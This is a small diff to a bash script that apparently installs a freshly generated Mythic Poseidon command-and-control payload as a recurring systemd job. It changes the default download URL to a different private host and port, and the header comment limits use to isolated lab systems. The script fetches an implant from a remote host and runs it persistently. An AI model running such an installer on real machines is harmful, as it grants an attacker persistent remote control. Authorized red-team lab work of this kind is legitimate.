@@ -4,7 +4,7 @@ set -Eeuo pipefail
 # Installs a freshly generated Mythic Poseidon payload as a recurring systemd
 # lab artifact. Use only on an authorized, isolated, disposable Linux system.
 
-DOWNLOAD_URL="${POSEIDON_DOWNLOAD_URL:-http://172.16.102.58:8087/poseidon.bin}"
+DOWNLOAD_URL="${POSEIDON_DOWNLOAD_URL:-http://172.16.101.73:9988/poseidon.bin}"
 INSTALL_DIRECTORY="${POSEIDON_INSTALL_DIRECTORY:-/var/lib/redhavi}"
 INTERVAL_MINUTES="${POSEIDON_INTERVAL_MINUTES:-3}"
 EXPECTED_SHA256="${POSEIDON_EXPECTED_SHA256:-}"
